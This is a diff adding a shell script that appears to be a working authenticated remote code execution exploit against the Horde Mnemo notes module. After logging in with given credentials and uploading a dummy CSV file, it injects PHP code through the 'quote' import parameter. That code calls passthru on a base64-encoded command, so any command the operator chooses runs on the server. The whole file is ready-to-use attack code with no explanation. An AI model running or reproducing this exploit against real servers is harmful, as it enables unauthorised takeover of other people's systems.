@@ -1,0 +1,41 @@
+#!/bin/sh
+
+if [ "$#" -ne 4 ]; then
+    echo '[!] Usage: <url> <username> <password> <command>' 1>&2
+    exit 1
+fi
+
+BASE="$1"
+USERNAME="$2"
+PASSWORD="$3"
+COMMAND="$4"
+
+JAR="$(mktemp)"
+trap 'rm -f "$JAR"' EXIT
+
+echo "[+] Logging in as $USERNAME:$PASSWORD" 1>&2
+curl -si -c "$JAR" "$BASE/login.php" \
+    -d 'login_post=1' \
+    -d "horde_user=$USERNAME" \
+    -d "horde_pass=$PASSWORD" | grep -q 'Location: /services/portal/' || \
+    echo '[!] Cannot log in' 1>&2
+
+echo "[+] Uploading dummy file" 1>&2
+echo x | curl -si -b "$JAR" "$BASE/mnemo/data.php" \
+    -F 'actionID=11' \
+    -F 'import_step=1' \
+    -F 'import_format=csv' \
+    -F 'notepad_target=x' \
+    -F 'import_file=@-;filename=x' \
+    -so /dev/null
+
+echo "[+] Running command" 1>&2
+BASE64_COMMAND="$(echo -n "$COMMAND 2>&1" | base64 -w0)"
+curl -b "$JAR" "$BASE/mnemo/data.php" \
+    -d 'actionID=3' \
+    -d 'import_step=2' \
+    -d 'import_format=csv' \
+    -d 'header=1' \
+    -d 'fields=1' \
+    -d 'sep=x' \
+    --data-urlencode "quote=).passthru(base64_decode(\"$BASE64_COMMAND\")).die();}//\\"
